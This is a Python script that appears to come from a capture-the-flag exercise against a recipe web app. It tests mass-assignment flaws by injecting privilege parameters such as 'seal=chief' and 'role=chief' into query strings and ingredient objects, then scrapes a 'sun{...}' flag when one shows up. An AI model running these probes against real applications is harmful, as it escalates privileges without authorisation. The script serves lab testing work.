#!/usr/bin/env python3
"""Query-string merges and per-ingredient keys: two mass-assignment sinks never probed.

Both previous mass-assignment runs only touched the JSON body at the top level of
POST /api/recipe. Two other places where a framework commonly folds attacker input into a
document were left alone: the query string of the same routes (an
`Object.assign(doc, req.query)` or a `find({...req.query})` filter is invisible to body
testing), and extra keys *inside* ingredient objects (a `{...ing}` spread lands them
somewhere else entirely). Either one could put `seal: chief` on a batch, and the oracle is
free: the dashboard's Seal column, plus the `.seal.gold` / `<div class="flag">` block on
/recipe/<id> when it works.
"""
import re
import sys
import time

from cc import new_baker

Q = ["?seal=chief", "?seal=gold", "?level=chief", "?role=chief", "?status=reviewed",
     "?seal=chief&level=chief", "?gold=true", "?chief=1", "?owner=chief", "?reviewer=chief"]
QDASH = ["?seal=chief", "?q=chief", "?search=chief", "?status=draft", "?sort=seal",
         "?limit=50", "?all=1", "?user=chief", "?role=chief"]
IKEYS = ["seal", "level", "role", "status", "gold", "golden", "chief", "approved", "flag"]


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def seal_of(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash, re.S)
    if not blk:
        return "row?"
    tail = " ".join(re.sub(r"<[^>]+>", " ", blk.group(0).split("</span>")[-1]).split())
    return "NONE" if "&mdash;" in tail else tail[:30]


def gold_check(c, rid):
    code, page, dt = c.get("/recipe/%s" % rid)
    if not isinstance(page, str):
        return False
    fl = re.findall(r"sun\{[^{}\r\n]{1,200}\}", page)
    if fl or 'class="flag"' in page or "seal gold" in page:
        open("../flag.txt", "w", encoding="utf-8").write((fl[0] if fl else "") + "\n")
        open("../files/golden_qmark.html", "w", encoding="utf-8").write(page)
        w("      !!! GOLDEN: %s / %d bytes" % (fl, len(page)))
        return True
    return False


u, c, _ = new_baker("qm")
w("user %s" % u)
base = [{"name": "flour", "value": "1"}]

w("=== A. query string on POST /api/recipe and on submit ===")
for q in Q:
    code, out, dt = c.post("/api/recipe" + q, {"title": "q" + q[:14], "ingredients": base})
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        w("  %-22s save -> %s %s" % (q, code, str(out)[:70]))
        continue
    s0 = seal_of(c, rid)
    scode, sout, _ = c.post("/api/recipe/%s/submit%s" % (rid, q), {})
    time.sleep(12)
    s1 = seal_of(c, rid)
    w("  %-22s before=%-14s submit=%s after=%-14s" % (q, s0, scode, s1))
    gold_check(c, rid)
    if len(re.findall(r"/recipe/([0-9a-f]{24})", c.get("/dashboard")[1])) >= 9:
        u2, c, _ = new_baker("qm")
        w("  (user full, switched to %s)" % u2)
    time.sleep(1)

w("=== B. extra keys inside ingredient objects ===")
for k in IKEYS:
    ings = [{"name": "flour", "value": "1", k: "chief"}]
    code, out, dt = c.post("/api/recipe", {"title": "i" + k, "ingredients": ings})
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        w("  %-10s save -> %s %s" % (k, code, str(out)[:70]))
        continue
    s0 = seal_of(c, rid)
    code2, page, _ = c.get("/review/%s" % rid)
    mixed = bool(re.search(r'"%s"' % k, page))
    c.post("/api/recipe/%s/submit" % rid, {})
    time.sleep(12)
    s1 = seal_of(c, rid)
    w("  %-10s before=%-14s key-in-page=%s after=%-14s" % (k, s0, mixed, s1))
    gold_check(c, rid)

w("=== C. does any query parameter change what /dashboard shows? ===")
code, dash0, dt = c.get("/dashboard")
for q in QDASH:
    code, dash, dt = c.get("/dashboard" + q)
    n0 = len(re.findall(r"/recipe/([0-9a-f]{24})", dash0))
    n1 = len(re.findall(r"/recipe/([0-9a-f]{24})", dash)) if isinstance(dash, str) else -1
    w("  %-18s rows %d -> %d  len %d -> %d" % (q, n0, n1, len(dash0), len(dash) if isinstance(dash, str) else -1))

w("=== D. query string on /api/seal ===")
for q in ["?seal=chief", "?role=chief", "?level=chief", "?user=chief"]:
    code, out, dt = c.post("/api/seal" + q, {"recipeId": "0" * 24})
    w("  %-16s -> %s %s" % (q, code, str(out)[:70]))
w("done")
